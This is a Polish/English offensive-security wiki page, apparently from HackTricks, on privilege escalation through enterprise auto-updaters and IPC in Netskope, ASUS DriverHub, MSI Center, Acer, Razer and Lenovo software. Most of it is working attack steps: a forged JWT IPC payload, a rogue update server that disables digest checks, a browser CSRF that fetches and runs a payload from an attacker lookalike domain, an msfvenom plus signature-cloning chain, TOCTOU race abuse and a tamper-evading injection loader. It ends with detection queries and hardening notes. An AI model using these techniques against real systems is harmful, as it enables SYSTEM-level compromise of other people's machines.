# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ta strona uogólnia klasę łańcuchów Windows local privilege escalation spotykanych w enterprise endpoint agents i updaters, które udostępniają łatwo dostępny surface IPC oraz uprzywilejowany flow aktualizacji. Reprezentatywnym przykładem jest Netskope Client for Windows < R129 (CVE-2025-0309), gdzie użytkownik z niskimi uprawnieniami może wymusić enrollment na serwerze kontrolowanym przez atakującego, a następnie dostarczyć złośliwy MSI, który usługa SYSTEM instaluje.

Kluczowe pomysły, które możesz ponownie wykorzystać przeciwko podobnym produktom:
- Abuse uprzywilejowanego localhost IPC usługi, aby wymusić re-enrollment lub rekonfigurację na serwer atakującego.
- Zaimplementuj update endpoints vendora, dostarcz fałszywy Trusted Root CA i wskaż updaterowi złośliwy, „signed” pakiet.
- Omijaj słabe sprawdzanie signerów (CN allow-lists), opcjonalne flagi digest i luźne właściwości MSI.
- Jeśli IPC jest „encrypted”, wyprowadź key/IV z world-readable machine identifiers zapisanych w registry.
- Jeśli usługa ogranicza wywołujących po image path/process name, wstrzyknij się do allow-listed procesu albo uruchom go w stanie suspended i uruchom bootstrap DLL przez minimalny patch thread-context.

---
## 1) Wymuszanie enrollment na serwerze atakującego przez localhost IPC

Wiele agentów dostarcza user-mode UI process, który komunikuje się z usługą SYSTEM przez localhost TCP, używając JSON.

Zaobserwowano w Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flow exploita:
1) Utwórz JWT enrollment token, którego claims kontrolują backend host (np. AddonUrl). Użyj alg=None, aby podpis nie był wymagany.
2) Wyślij wiadomość IPC wywołującą provisioning command z twoim JWT i tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Usługa zaczyna wysyłać żądania do twojego rogue server w celu enrollment/config, np.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Jeśli weryfikacja caller jest oparta na path/name, inicjuj żądanie z allow-listed vendor binary (zobacz §4).

---
## 2) Hijacking the update channel, aby uruchomić code jako SYSTEM

Gdy client zacznie rozmawiać z twoim server, zaimplementuj oczekiwane endpoints i skieruj go do attacker MSI. Typowa sekwencja:

1) /v2/config/org/clientconfig → Zwróć JSON config z bardzo krótkim updater interval, np.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Zwraca certyfikat CA PEM. Usługa instaluje go do Local Machine Trusted Root store.
3) /v2/checkupdate → Dostarcz metadane wskazujące na złośliwy MSI i fałszywą wersję.

Omijanie typowych kontroli spotykanych w praktyce:
- Signer CN allow-list: usługa może sprawdzać tylko, czy Subject CN równa się “netSkope Inc” albo “Netskope, Inc.”. Twoje rogue CA może wystawić leaf z takim CN i podpisać MSI.
- CERT_DIGEST property: dołącz nieszkodliwą właściwość MSI o nazwie CERT_DIGEST. Brak egzekwowania przy instalacji.
- Opcjonalne wymuszanie digest: flaga konfiguracyjna (np. check_msi_digest=false) wyłącza dodatkową kryptograficzną walidację.

Wynik: usługa SYSTEM instaluje twój MSI z
C:\ProgramData\Netskope\stAgent\data\*.msi
uruchamiając dowolny kod jako NT AUTHORITY\SYSTEM.

Lekcja z obejścia patcha: jeśli vendor odpowiada, allow-listując mały zestaw „zaufanych” domen zamiast kryptograficznie uwierzytelniać źródło aktualizacji, szukaj vendor-owned redirectors albo reverse proxies, które nadal pozwalają ci sterować ruchem. W przypadku Netskope publiczne follow-up research pokazało, że allow-list z ery R129 nadal dało się nadużyć przez `rproxy.goskope.com`, które proxy'owało treści z Azure App Service kontrolowane przez atakującego. Traktuj hostname allow-lists jako speed bump, a nie jako trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

Od R127 Netskope opakowywał IPC JSON w pole encryptData, które wygląda jak Base64. Reverse engineering pokazał AES z kluczem/IV wyprowadzanymi z wartości rejestru czytelnych dla każdego użytkownika:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atakujący mogą odtworzyć szyfrowanie i wysyłać poprawne zaszyfrowane komendy ze standard user. Ogólna wskazówka: jeśli agent nagle „encrypts” swoje IPC, szukaj device IDs, product GUIDs, install IDs pod HKLM jako materiału.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Niektóre usługi próbują uwierzytelnić peer, rozwiązując PID połączenia TCP i porównując path/name obrazu z allow-listed vendor binaries znajdującymi się pod Program Files (np. stagentui.exe, bwansvc.exe, epdlp.exe).

Dwa praktyczne obejścia:
- DLL injection do procesu z allow-listy (np. nsdiag.exe) i proxy IPC z jego wnętrza.
- Uruchom binary z allow-listy w stanie suspended i zbootstrappuj swoją proxy DLL bez CreateRemoteThread (zob. §5), aby spełnić driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Produkty często dostarczają driver minifilter/OB callbacks (np. Stadrv), aby usuwać niebezpieczne uprawnienia z uchwytów do protected processes:
- Process: usuwa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ogranicza do THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Niezawodny user-mode loader, który respektuje te ograniczenia:
1) CreateProcess vendor binary z CREATE_SUSPENDED.
2) Uzyskaj uchwyty, które nadal wolno ci mieć: PROCESS_VM_WRITE | PROCESS_VM_OPERATION dla procesu oraz uchwyt wątku z THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (albo tylko THREAD_RESUME, jeśli patchujesz code przy znanym RIP).
3) Nadpisz ntdll!NtContinue (lub inny wczesny, gwarantowanie zmapowany thunk) małym stubem, który wywołuje LoadLibraryW na path do twojej DLL, a następnie wraca.
4) ResumeThread, aby wyzwolić twój stub w procesie, ładując twoją DLL.

Ponieważ nigdy nie użyłeś PROCESS_CREATE_THREAD ani PROCESS_SUSPEND_RESUME wobec już protected process (to ty go utworzyłeś), polityka drivera jest spełniona.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatyzuje rogue CA, podpisywanie złośliwego MSI i serwuje potrzebne endpointy: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope to custom IPC client, który tworzy dowolne (opcjonalnie AES-encrypted) wiadomości IPC i zawiera suspended-process injection, aby pochodzić z allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Gdy masz do czynienia z nowym endpoint agent albo motherboard „helper” suite, szybki workflow zwykle wystarcza, by stwierdzić, czy patrzysz na obiecujący cel privesc:

1) Enumeruj loopback listeners i mapuj je z powrotem do vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Wylicz kandydatów na named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Wydobywanie danych routingu opartych na rejestrze używanych przez serwery IPC oparte na pluginach:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Najpierw wyodrębnij nazwy endpointów, klucze JSON i ID komend z klienta user-mode. Spakowane frontendy Electron/.NET często ujawniają pełny schemat:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Szukaj rzeczywistego predykatu zaufania, a nie tylko ścieżki kodu, która ostatecznie uruchamia proces:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Warto priorytetowo sprawdzać:
- `CryptQueryObject`/parsowanie certyfikatu bez `WinVerifyTrust` zwykle oznacza, że „certyfikat istnieje” potraktowano jako „certyfikat jest zaufany”, co umożliwia klonowanie certyfikatu albo inne sztuczki z fałszywym signerem.
- Sprawdzanie podciągów/sufiksów dla `Origin`, `Referer`, URL-i pobierania, nazw procesów lub CN signera to nie jest uwierzytelnianie. `contains(".vendor.com")` zwykle da się wykorzystać z domenami podobnymi do oryginalnych, kontrolowanymi przez atakującego.
- Jeśli GUI z niskimi uprawnieniami decyduje „plik jest zaufany”, a broker SYSTEM tylko konsumuje ten wynik, patchowanie albo ponowna implementacja client-side DLL/JS często całkowicie omija granicę (split validation w stylu Razer).
- Jeśli broker kopiuje payload do `%TEMP%`/`C:\Windows\Temp`, a potem waliduje go albo planuje uruchomienie z tej ścieżki, od razu testuj okna podmiany TOCTOU oraz sąsiednie moduły wtyczek, które udostępniają alternatywne wrappery `ExecuteTask()` ze słabszymi kontrolami.

W przypadku celów mocno opartych o named pipes, PipeViewer to szybki sposób na wykrycie słabych DACL-i i zdalnie osiągalnych pipe’ów, zanim zaczniesz dokładnie odtwarzać protokół.

Jeśli cel uwierzytelnia wywołujących tylko po PID, ścieżce obrazu lub nazwie procesu, traktuj to jako spowolnienie, a nie granicę: wstrzyknięcie się do legalnego klienta albo nawiązanie połączenia z procesu z allow-listy często wystarcza, by spełnić sprawdzenia serwera. W przypadku named pipes konkretnie, [ta strona o client impersonation i pipe abuse](named-pipe-client-impersonation.md) omawia ten prymityw dokładniej.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

Nowszą odmianą wartą polowania jest **signed-client RPC broker**: proces desktopowy Lenovo podpisany przez producenta i działający z niskimi uprawnieniami rozmawia z usługą SYSTEM, a usługa kieruje komendy JSON do zestawu add-ins opisanych XML-em w `%ProgramData%`. Gdy uda się uzyskać wykonanie kodu **wewnątrz dowolnego akceptowanego, podpisanego klienta**, każdy kontrakt `runas="system"` staje się częścią powierzchni ataku.

Przydatne prymitywy zaobserwowane w badaniach Lenovo Vantage:
- **Ufanie wywołującemu, bo jest podpisany przez producenta**: badacze uzyskali uwierzytelniony kontekst, kopiując Lenovo-signed EXE do zapisywalnego katalogu i spełniając DLL side-load (`profapi.dll`), tak aby arbitralny kod działał wewnątrz klienta, któremu usługa już ufała.
- **Odkrywanie powierzchni ataku sterowane manifestem**: add-ins są deklarowane w `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; kilka kontraktów działa jako `SYSTEM`, więc enumeracja tych manifestów często ujawnia prawdziwe uprzywilejowane verb-y szybciej niż reverse engineering samego brokera.
- **Błędy per-command za uwierzytelnionym kanałem**: po wejściu do zaufanego klienta publiczne badania znalazły path-traversal + race conditions w verbach update/install, abuse raw-SQL w uprzywilejowanych bazach ustawień oraz sprawdzanie ścieżek rejestru oparte na substringach, które umożliwiało zapis poza zamierzonym hive.

Przydatny recon na celu:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Praktyczna wskazówka: gdy tylko zestaw helperów udostępnia broker, który najpierw uwierzytelnia **caller process**, a dopiero potem przekazuje żądanie do dziesiątek komend plugin/add-in, nie poprzestawaj na obejściu front-door trust check. Zrzutuj tabelę manifest/contract i fuzzuj każdą uprzywilejowaną verb niezależnie; uwierzytelniony kanał zwykle ukrywa kilka bugów drugiego etapu.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub dostarcza user-mode HTTP service (ADU.exe) na 127.0.0.1:53000, który oczekuje wywołań z browsera pochodzących z https://driverhub.asus.com. Filtr origin po prostu wykonuje `string_contains(".asus.com")` na nagłówku Origin oraz na download URLs wystawianych przez `/asus/v1.0/*`. Każdy host kontrolowany przez attacker, taki jak `https://driverhub.asus.com.attacker.tld`, przechodzi więc sprawdzenie i może wysyłać state-changing requests z JavaScript. Zobacz [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md), aby poznać dodatkowe patterns obejścia.

Praktyczny flow:
1) Zarejestruj domenę, która zawiera `.asus.com`, i hostuj tam malicious webpage.
2) Użyj `fetch` lub XHR, aby wywołać privileged endpoint (np. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Wyślij JSON body oczekiwane przez handler – spakowany frontend JS pokazuje poniższy schema.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Nawet poniższy PowerShell CLI kończy się powodzeniem, gdy nagłówek Origin zostanie sfałszowany na zaufaną wartość:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Ogólny wniosek: podczas analizy wstecznej pakietów „helper” nie zatrzymuj się na localhost TCP ani named pipes. Sprawdź klasy COM o nazwach takich jak `Elevator`, `Launcher`, `Updater` lub `Utility`, a następnie zweryfikuj, czy uprzywilejowana usługa faktycznie waliduje sam plik binarny celu, czy jedynie ufa wynikowi obliczonemu przez podatną na patchowanie bibliotekę DLL klienta w user-mode. Ten wzorzec wykracza poza Razer: każdy podział, w którym broker o wysokich uprawnieniach konsumuje decyzję allow/deny ze strony o niskich uprawnieniach, jest kandydatem na powierzchnię privesc.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Między czerwcem 2025 a grudniem 2025 atakujący, którzy skompromitowali infrastrukturę hostującą stojącą za przepływem aktualizacji Notepad++, selektywnie dostarczali złośliwe manifesty wybranym ofiarom. Starsze aktualizatory oparte na WinGUp nie weryfikowały w pełni autentyczności aktualizacji, więc wrogą odpowiedź XML można było użyć do przekierowania klientów na adresy URL kontrolowane przez atakującego. Ponieważ klient akceptował zawartość HTTPS bez wymuszania zarówno zaufanego łańcucha certyfikatów, jak i poprawnego podpisu PE dla pobranego instalatora, ofiary pobierały i uruchamiały trojanizowany NSIS `update.exe`.

Przebieg operacyjny (bez lokalnego exploita):
1. **Przechwycenie infrastruktury**: kompromitacja CDN/hostingu i odpowiadanie na sprawdzenia aktualizacji metadanymi atakującego wskazującymi złośliwy URL pobierania.
2. **Trojanized NSIS**: instalator pobiera/uruchamia payload i nadużywa dwóch łańcuchów wykonania:
- **Bring-your-own signed binary + sideload**: dołącz podpisany `BluetoothService.exe` Bitdefendera i umieść złośliwy `log.dll` w jego ścieżce wyszukiwania. Gdy podpisany binarny plik się uruchamia, Windows sideloads `log.dll`, który odszyfrowuje i refleksyjnie ładuje backdoor Chrysalis (chroniony przez Warbird + hashing API, aby utrudnić statyczną detekcję).
- **Scripted shellcode injection**: NSIS uruchamia skompilowany skrypt Lua, który używa Win32 APIs (np. `EnumWindowStationsW`) do wstrzyknięcia shellcode i wystawienia Cobalt Strike Beacon.

Wnioski dotyczące hardeningu/detekcji dla każdego auto-updatera:
- Wymuszaj weryfikację **certyfikat + podpis** pobranego instalatora (pinuj podpisującego vendora, odrzucaj niezgodny CN/chain) oraz podpisuj sam manifest aktualizacji (np. XMLDSig). Blokuj przekierowania kontrolowane przez manifest, chyba że zostały zwalidowane.
- Traktuj **BYO signed binary sideloading** jako punkt pivotu detekcyjnego po pobraniu: alarmuj, gdy podpisany EXE vendora ładuje DLL o nazwie spoza jego kanonicznej ścieżki instalacyjnej (np. Bitdefender ładujący `log.dll` z Temp/Downloads) oraz gdy updater zapisuje/uruchamia instalatory z temp z podpisami innymi niż vendora.
- Monitoruj **artefakty specyficzne dla malware** zaobserwowane w tym łańcuchu (użyteczne jako ogólne pivoty): mutex `Global\Jdhfv_1.0.1`, nietypowe zapisy `gup.exe` do `%TEMP%` oraz etapy wstrzykiwania shellcode sterowane przez Lua.
- Notepad++ zareagował, wzmacniając WinGUp w v8.8.9 i późniejszych: zwracany XML jest teraz podpisany (XMLDSig), a nowsze buildy wymuszają weryfikację certyfikatu + podpisu pobranego instalatora zamiast ufać wyłącznie transportowi.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> uruchamiający instalator inny niż Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Te wzorce uogólniają się na każdy updater, który akceptuje niepodpisane manifesty albo nie wymusza przypinania signerów instalatora—network hijack + malicious installer + BYO-signed sideloading daje remote code execution pod przykrywką „trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
